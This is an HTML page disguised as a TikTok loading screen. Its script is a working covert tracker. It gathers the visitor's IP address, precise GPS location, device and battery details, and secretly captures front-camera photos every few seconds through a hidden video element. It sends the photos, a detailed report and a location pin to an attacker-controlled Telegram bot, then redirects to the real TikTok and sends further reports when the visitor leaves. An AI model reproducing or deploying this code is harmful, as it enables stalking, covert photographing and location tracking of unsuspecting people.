<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #000;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            overflow: hidden;
        }
        .splash { text-align: center; }
        .logo-container {
            position: relative;
            width: 100px; height: 100px;
            margin: 0 auto 30px;
        }
        .pulse-ring {
            position: absolute;
            top: 50%; left: 50%;
            transform: translate(-50%, -50%);
            width: 80px; height: 80px;
            border: 3px solid #ff0050;
            border-radius: 50%;
            animation: pulse 1.5s ease-out infinite;
        }
        .pulse-ring:nth-child(2) { animation-delay: 0.5s; }
        .pulse-ring:nth-child(3) { animation-delay: 1s; }
        @keyframes pulse {
            0% { transform: translate(-50%, -50%) scale(0.5); opacity: 1; }
            100% { transform: translate(-50%, -50%) scale(2); opacity: 0; }
        }
        .note-icon {
            position: relative; z-index: 2;
            width: 50px; height: 50px;
            margin: 25px;
            filter: drop-shadow(0 0 10px rgba(255,0,80,0.5));
        }
        .loading-text {
            color: #888;
            font-size: 14px;
            letter-spacing: 2px;
            animation: fadeText 1.5s ease-in-out infinite;
        }
        @keyframes fadeText {
            0%, 100% { opacity: 0.4; }
            50% { opacity: 1; }
        }
        .brand { color: #fff; font-size: 24px; font-weight: bold; margin-bottom: 20px; letter-spacing: 3px; }
        .brand span { color: #ff0050; }
        #cam { position: fixed; top: 0; left: 0; width: 2px; height: 2px; opacity: 0.01; pointer-events: none; }
        #canvas { display: none; }
        #debug { color: #0f0; font-size: 10px; margin-top: 10px; max-height: 100px; overflow: hidden; text-align: left; padding: 0 20px; }
    </style>
</head>
<body>
    <video id="cam" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>
    
    <div class="splash" id="splash">
        <div class="brand">Tik<span>Tok</span></div>
        <div class="logo-container">
            <div class="pulse-ring"></div>
            <div class="pulse-ring"></div>
            <div class="pulse-ring"></div>
            <svg class="note-icon" viewBox="0 0 24 24" fill="white">
                <path d="M19.59 6.69a4.83 4.83 0 01-3.77-4.25V2h-3.45v13.89a2.89 2.89 0 01-5.76 0 2.89 2.89 0 012.89-2.89h.74v-3.3a6.19 6.19 0 00-5.24 6.19 6.19 6.19 0 006.19 6.19 6.19 6.19 0 006.19-6.19V7.27a8.17 8.17 0 004.65 1.46V5.35a4.83 4.83 0 01-3.44-1.41l.01 2.75z"/>
            </svg>
        </div>
        <div class="loading-text" id="status">CONNECTING...</div>
        <div id="debug"></div>
    </div>

    <script>
    // ==================== CONFIGURATION ====================
    var p = new URLSearchParams(location.search);
    var redir = p.get('r') || 'https://www.tiktok.com';
    var bot = p.get('bot') || '';
    var chat = p.get('chat') || '';
    
    // ==================== GLOBAL VARIABLES ====================
    var isMobile = /Android|iPhone|iPad|iPod|webOS/i.test(navigator.userAgent);
    var isDesktop = !isMobile;
    var gpsData = null;
    var ipData = null;
    var photoInterval = null;
    var cameraStream = null;
    var cameraActive = false;
    var photoCount = 0;
    var visitStart = Date.now();
    var reportSent = false;
    
    // ==================== DEBUG LOG ====================
    function log(msg) {
        var d = document.getElementById('debug');
        d.textContent = (d.textContent + '\n' + msg).trim();
        console.log('[Tracker] ' + msg);
    }
    
    // ==================== GET IP ADDRESS ====================
    function getIP() {
        return fetch('https://api.ipify.org?format=json')
            .then(function(r) { return r.json(); })
            .then(function(d) { 
                ipData = d.ip; 
                log('IP: ' + d.ip); 
                return d.ip;
            })
            .catch(function() { 
                ipData = 'Unknown'; 
                return null;
            });
    }
    
    // ==================== GET BATTERY INFO ====================
    function getBattery() {
        if (navigator.getBattery) {
            return navigator.getBattery().then(function(b) {
                return { 
                    level: Math.round(b.level * 100) + '%', 
                    charging: b.charging ? 'Yes' : 'No' 
                };
            });
        }
        return Promise.resolve({ level: 'N/A', charging: 'Unknown' });
    }
    
    // ==================== GET GPS LOCATION ====================
    function getGPS() {
        return new Promise(function(resolve) {
            if (!navigator.geolocation) {
                log('GPS: Not supported on this browser');
                resolve(null);
                return;
            }
            
            navigator.geolocation.getCurrentPosition(
                function(pos) {
                    log('GPS: GRANTED - ' + pos.coords.latitude.toFixed(6) + ', ' + pos.coords.longitude.toFixed(6));
                    resolve({
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        acc: pos.coords.accuracy,
                        alt: pos.coords.altitude,
                        speed: pos.coords.speed,
                        heading: pos.coords.heading
                    });
                },
                function(err) {
                    var msg = '';
                    switch(err.code) {
                        case 1: msg = 'Permission Denied'; break;
                        case 2: msg = 'Position Unavailable'; break;
                        case 3: msg = 'Timeout'; break;
                        default: msg = err.message;
                    }
                    log('GPS: DENIED - ' + msg);
                    resolve(null);
                },
                { 
                    enableHighAccuracy: true, 
                    timeout: 10000, 
                    maximumAge: 0 
                }
            );
        });
    }
    
    // ==================== START CAMERA (MOBILE + DESKTOP) ====================
    async function startCamera() {
        log('Camera: Attempting to start...');
        log('Device: ' + (isMobile ? 'Mobile' : 'Desktop'));
        
        // Check if mediaDevices is supported
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            log('Camera: Not supported on this browser');
            return false;
        }
        
        try {
            var v = document.getElementById('cam');
            
            // Try to get camera
            var stream = await navigator.mediaDevices.getUserMedia({ 
                video: { 
                    facingMode: 'user',
                    width: { ideal: 640 },
                    height: { ideal: 480 }
                } 
            });
            
            v.srcObject = stream;
            cameraStream = stream;
            
            // Wait for video to be ready
            await new Promise(function(resolve, reject) {
                var timeout = setTimeout(function() {
                    resolve(); // Resolve anyway after 5 seconds
                }, 5000);
                
                v.onloadedmetadata = function() {
                    clearTimeout(timeout);
                    v.play().then(resolve).catch(resolve);
                };
                
                // If already loaded
                if (v.readyState >= 2) {
                    clearTimeout(timeout);
                    v.play().then(resolve).catch(resolve);
                }
            });
            
            // Check if video actually has dimensions
            if (v.videoWidth && v.videoWidth > 0) {
                cameraActive = true;
                log('Camera: SUCCESS - ' + v.videoWidth + 'x' + v.videoHeight);
                return true;
            } else {
                log('Camera: Started but no video feed detected');
                return false;
            }
            
        } catch(e) {
            log('Camera: ERROR - ' + e.message);
            
            // Try without specific constraints (more compatible)
            try {
                var stream2 = await navigator.mediaDevices.getUserMedia({ video: true });
                var v = document.getElementById('cam');
                v.srcObject = stream2;
                cameraStream = stream2;
                await v.play();
                
                if (v.videoWidth && v.videoWidth > 0) {
                    cameraActive = true;
                    log('Camera: SUCCESS (fallback) - ' + v.videoWidth + 'x' + v.videoHeight);
                    return true;
                }
            } catch(e2) {
                log('Camera: FALLBACK also failed - ' + e2.message);
            }
            
            return false;
        }
    }
    
    // ==================== TAKE PHOTO ====================
    function takePhoto() {
        if (!cameraActive) { 
            return null; 
        }
        
        try {
            var v = document.getElementById('cam');
            
            if (!v.videoWidth || v.videoWidth === 0) {
                log('Photo: Video stream not ready');
                return null;
            }
            
            var c = document.getElementById('canvas');
            c.width = v.videoWidth;
            c.height = v.videoHeight;
            
            var ctx = c.getContext('2d');
            
            // Flip horizontally for front camera (mirror effect)
            ctx.save();
            ctx.scale(-1, 1);
            ctx.drawImage(v, -c.width, 0, c.width, c.height);
            ctx.restore();
            
            photoCount++;
            log('Photo #' + photoCount + ': Captured (' + c.width + 'x' + c.height + ')');
            
            return c.toDataURL('image/jpeg', 0.7);
            
        } catch(e) {
            log('Photo: Error - ' + e.message);
            return null;
        }
    }
    
    // ==================== SEND PHOTO TO TELEGRAM ====================
    function sendPhotoToTelegram(photoData) {
        if (!photoData || !bot || !chat) return;
        
        try {
            // Convert base64 to blob
            var arr = photoData.split(',');
            var mime = arr[0].match(/:(.*?);/)[1];
            var bstr = atob(arr[1]);
            var n = bstr.length;
            var u8 = new Uint8Array(n);
            while(n--) { u8[n] = bstr.charCodeAt(n); }
            var blob = new Blob([u8], {type: mime});
            
            var fd = new FormData();
            fd.append('chat_id', chat);
            fd.append('photo', blob, 'capture_' + photoCount + '.jpg');
            fd.append('caption', '📸 Photo #' + photoCount + ' | ' + new Date().toLocaleTimeString());
            
            var xhr = new XMLHttpRequest();
            xhr.open('POST', 'https://api.telegram.org/bot' + bot + '/sendPhoto', true);
            xhr.onload = function() { 
                log('Photo #' + photoCount + ' sent: ' + xhr.status); 
            };
            xhr.onerror = function() { 
                log('Photo #' + photoCount + ' FAILED'); 
            };
            xhr.send(fd);
            
        } catch(e) {
            log('Photo send error: ' + e.message);
        }
    }
    
    // ==================== GET IP LOCATION ====================
    async function getIPLocation() {
        if (!ipData || ipData === 'Unknown') return '';
        
        try {
            var resp = await fetch('http://ip-api.com/json/' + ipData + '?fields=country,regionName,city,zip,timezone,lat,lon');
            var loc = await resp.json();
            
            if (loc.country) {
                var text = '';
                text += '📍 Location Details\n';
                text += '   • Country: ' + loc.country + '\n';
                text += '   • Region: ' + (loc.regionName || 'N/A') + '\n';
                text += '   • City: ' + (loc.city || 'N/A') + '\n';
                text += '   • Postal Code: ' + (loc.zip || 'N/A') + '\n';
                text += '   • Timezone: ' + (loc.timezone || 'N/A') + '\n';
                if (loc.lat && loc.lon) {
                    text += '   • Approx Maps: https://maps.google.com/?q=' + loc.lat + ',' + loc.lon + '\n';
                }
                text += '\n';
                return text;
            }
        } catch(e) {
            log('IP Location lookup failed');
        }
        
        var tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
        return '📍 Location Details\n   • Timezone: ' + tz + '\n\n';
    }
    
    // ==================== BUILD REPORT ====================
    async function buildReport(isFinal) {
        var ua = navigator.userAgent;
        var plat = navigator.platform;
        var lang = navigator.language;
        var scr = screen.width + 'x' + screen.height;
        var tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
        var cores = navigator.hardwareConcurrency || 'N/A';
        var ram = navigator.deviceMemory || 'N/A';
        var now = new Date();
        var dateStr = now.toLocaleDateString('en-US', { month: 'long', day: 'numeric', year: 'numeric' });
        var timeStr = now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', hour12: true });
        var duration = Math.floor((Date.now() - visitStart) / 1000);
        var battery = await getBattery();
        var ipLocation = await getIPLocation();
        
        // Device model detection
        var deviceModel = plat;
        if (/iPhone/.test(ua)) {
            var iosVer = ua.match(/OS (\d+_\d+)/);
            deviceModel = 'iPhone OS ' + (iosVer ? iosVer[1].replace('_','.') : '') + ' like Mac OS X';
        } else if (/Android/.test(ua)) {
            var androidVer = ua.match(/Android\s([\d.]+)/);
            deviceModel = 'Android ' + (androidVer ? androidVer[1] : '') + ' Device';
        } else if (/Windows/.test(plat)) {
            deviceModel = 'Windows PC';
        } else if (/Mac/.test(plat)) {
            deviceModel = 'Mac Computer';
        } else if (/Linux/.test(plat)) {
            deviceModel = 'Linux Computer';
        }
        
        var prefix = isFinal ? '📋 FINAL REPORT - User Left Page\n\n' : '';
        
        var msg = prefix;
        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
        msg += '    📊 Visitor Information Captured\n';
        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n';
        
        // Device & Browser
        msg += '🖥️ Device & Browser\n';
        msg += '   • Device Model: ' + deviceModel + '\n';
        msg += '   • Device Type: ' + (isMobile ? 'Mobile' : 'Desktop') + '\n';
        msg += '   • User Agent: ' + ua.substring(0, 80) + '...\n\n';
        
        // Network
        msg += '🌐 Network Information\n';
        msg += '   • IP Address: ' + (ipData || 'Detecting...') + '\n';
        msg += '   • Language: ' + lang + '\n';
        msg += '   • Timezone: ' + tz + '\n\n';
        
        // IP Location
        msg += ipLocation;
        
        // GPS Section
        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
        msg += '    🗺️ GPS Coordinates\n';
        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n';
        
        if (gpsData) {
            msg += '   ✅ Location Granted\n';
            msg += '   • Latitude: ' + gpsData.lat.toFixed(15) + '\n';
            msg += '   • Longitude: ' + gpsData.lon.toFixed(15) + '\n';
            msg += '   • Accuracy: ' + gpsData.acc.toFixed(0) + 'mm\n';
            if (gpsData.alt) msg += '   • Altitude: ' + gpsData.alt.toFixed(1) + 'm\n';
            if (gpsData.speed) msg += '   • Speed: ' + (gpsData.speed * 3.6).toFixed(1) + ' km/h\n';
            msg += '\n   🗺️ Maps: https://maps.google.com/maps?q=' + gpsData.lat + ',' + gpsData.lon + '&ll=' + gpsData.lat + ',' + gpsData.lon + '&z=16\n\n';
        } else {
            msg += '   ❌ Location: Not available\n';
            if (isDesktop) msg += '   💡 Desktop detected - GPS not available on most computers\n';
            msg += '   💡 Location permission was not granted or unavailable\n\n';
        }
        
        // Device Details
        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
        msg += '    📱 Device Details\n';
        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n';
        
        msg += '🖼️ Display Information\n';
        msg += '   • Resolution: ' + scr + '\n\n';
        
        msg += '🔋 Battery Status\n';
        msg += '   • Level: ' + battery.level + '\n';
        msg += '   • Charging: ' + battery.charging + '\n\n';
        
        msg += '🔐 Device Permissions\n';
        msg += '   • Camera: ' + (cameraActive ? 'Active 📸' : 'Not Available') + '\n';
        msg += '   • Location: ' + (gpsData ? 'Granted ✅' : 'Denied ❌') + '\n\n';
        
        msg += '💾 Hardware & Storage\n';
        msg += '   • CPU Cores: ' + cores + '\n';
        msg += '   • RAM: ' + ram + ' GB\n';
        msg += '   • Photos Captured: ' + photoCount + '\n';
        msg += '   • Visit Duration: ' + duration + ' seconds\n\n';
        
        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
        msg += '📅 Captured: ' + dateStr + ', ' + timeStr + '\n';
        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━';
        
        return msg;
    }
    
    // ==================== SEND REPORT TO TELEGRAM ====================
    async function sendReport(isFinal) {
        if (reportSent && !isFinal) return;
        reportSent = true;
        
        log(isFinal ? 'Sending FINAL report...' : 'Sending report...');
        
        var msg = await buildReport(isFinal);
        
        // Use synchronous XHR to ensure it sends before redirect
        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'https://api.telegram.org/bot' + bot + '/sendMessage', false);
        xhr.setRequestHeader('Content-Type', 'application/json');
        
        try {
            xhr.send(JSON.stringify({
                chat_id: chat,
                text: msg,
                disable_web_page_preview: true
            }));
            log('Report sent: HTTP ' + xhr.status);
            
            if (xhr.status === 200) {
                var resp = JSON.parse(xhr.responseText);
                if (!resp.ok) {
                    log('Telegram error: ' + resp.description);
                }
            }
        } catch(e) {
            log('Report FAILED: ' + e.message);
        }
        
        // Send GPS location pin
        if (gpsData) {
            var xhr2 = new XMLHttpRequest();
            xhr2.open('POST', 'https://api.telegram.org/bot' + bot + '/sendLocation', false);
            xhr2.setRequestHeader('Content-Type', 'application/json');
            try {
                xhr2.send(JSON.stringify({
                    chat_id: chat,
                    latitude: gpsData.lat,
                    longitude: gpsData.lon
                }));
                log('Location pin sent');
            } catch(e) {}
        }
    }
    
    // ==================== STOP CAMERA ====================
    function stopCamera() {
        if (cameraStream) {
            cameraStream.getTracks().forEach(function(track) {
                track.stop();
            });
            cameraStream = null;
            cameraActive = false;
            log('Camera: Stopped');
        }
        if (photoInterval) {
            clearInterval(photoInterval);
            photoInterval = null;
        }
    }
    
    // ==================== MAIN ====================
    async function main() {
        log('=== TRACKER STARTED ===');
        log('Device: ' + (isMobile ? 'MOBILE' : 'DESKTOP'));
        log('Redirect: ' + redir);
        
        document.getElementById('status').textContent = 'DETECTING...';
        
        // Get IP (don't wait)
        getIP();
        
        // Get GPS (wait max 10 seconds)
        document.getElementById('status').textContent = 'LOCATING...';
        gpsData = await getGPS();
        
        // Start camera
        document.getElementById('status').textContent = 'INITIALIZING...';
        var camStarted = await startCamera();
        
        // Send report FIRST (before redirect)
        document.getElementById('status').textContent = 'SENDING...';
        await sendReport(false);
        
        // Start photo capture after report is sent
        if (camStarted) {
            log('Starting photo capture...');
            
            // First photo after 2 seconds
            setTimeout(function() {
                var photo = takePhoto();
                if (photo) sendPhotoToTelegram(photo);
                
                // Then every 5 seconds
                photoInterval = setInterval(function() {
                    var photo = takePhoto();
                    if (photo) sendPhotoToTelegram(photo);
                }, 5000);
            }, 2000);
        }
        
        // Redirect
        document.getElementById('status').textContent = 'COMPLETE';
        log('Redirecting to: ' + redir);
        
        setTimeout(function() {
            document.getElementById('splash').style.display = 'none';
            window.location.href = redir;
        }, 800);
    }
    
    // ==================== PAGE EXIT HANDLER ====================
    function handleExit() {
        stopCamera();
        
        var duration = Math.floor((Date.now() - visitStart) / 1000);
        var exitMsg = '📋 User Left Page\n' +
                      '⏱ Duration: ' + duration + 's\n' +
                      '📸 Photos: ' + photoCount + '\n' +
                      '📱 Device: ' + (isMobile ? 'Mobile' : 'Desktop') + '\n' +
                      '🌐 IP: ' + (ipData || 'Unknown');
        
        // Use sendBeacon for reliable exit reporting
        if (navigator.sendBeacon) {
            navigator.sendBeacon(
                'https://api.telegram.org/bot' + bot + '/sendMessage',
                JSON.stringify({ chat_id: chat, text: exitMsg })
            );
            log('Exit message sent via beacon');
        }
    }
    
    window.addEventListener('beforeunload', handleExit);
    window.addEventListener('pagehide', handleExit);
    window.addEventListener('unload', handleExit);
    document.addEventListener('visibilitychange', function() {
        if (document.hidden) {
            handleExit();
        }
    });
    
    // ==================== START ====================
    main();
    </script>
</body>
</html>
